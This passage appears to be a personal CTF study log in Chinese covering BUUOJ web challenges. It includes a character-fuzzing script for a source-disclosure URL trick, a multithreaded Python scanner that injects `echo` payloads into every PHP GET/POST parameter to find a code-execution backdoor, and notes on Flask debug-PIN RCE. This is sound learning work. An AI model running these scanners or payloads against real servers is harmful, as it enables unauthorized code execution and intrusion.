`/index.php/config.php/%ff?source`
（这里不一定要%ff，别的可以跑一下下面的脚本试一下，）![](https://i.loli.net/2021/08/01/pzdNxK9YoQEmOrf.png)

```python
# 别的师傅fuzz的脚本
import requests
import re

for i in range(0,255):
    url ='xxxxx.node3.buuoj.cn/index.php/config.php/{}?source'.format(chr(i))
    print(url)
    r = requests.get(url)
    flag = re.findall("flag\{.*?\}", r.text)
    if flag:
        print(flag)
        break
```



## 2021.9.16

又捡起来了

### [强网杯 2019]高明的黑客

考验脚本编写能力，之前一直说学多线程，不过一直没学哈哈

试着写了一下，最后还是用其他师傅的脚本，人传人也不懂出自何处了

```python
import os
import requests
import re
import threading
import time

print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)                                            #这儿设置最大的线程数
filePath = r"D:/environment/phpstudy_pro/WWW/src"
os.chdir(filePath)                                                    #改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False                                             # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:                            #打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}                                                        #所有的$_POST
    params = {}                                                        #所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST
    req.close()                                                # 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()                                                # 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()                                                # 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:                                                            #加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

结果：

```
找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG
结束时间：  Thu Sep 16 20:16:31 2021
```



### [GYCTF2020]FlaskApp

懒得写了0-0，跟着wp学习一下

有两种思路：一是绕过过滤读flag，二是利用pin码进行rce

[GYCTF2020 FlaskApp_汗的博客-CSDN博客](https://blog.csdn.net/Alexhcf/article/details/108400293)

[Flask开启debug模式等于给黑客留了后门 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32138231)

[Flask debug 模式 PIN 码生成机制安全性研究笔记 - HacTF - 博客园 (cnblogs.com)](https://www.cnblogs.com/HacTF/p/8160076.html)





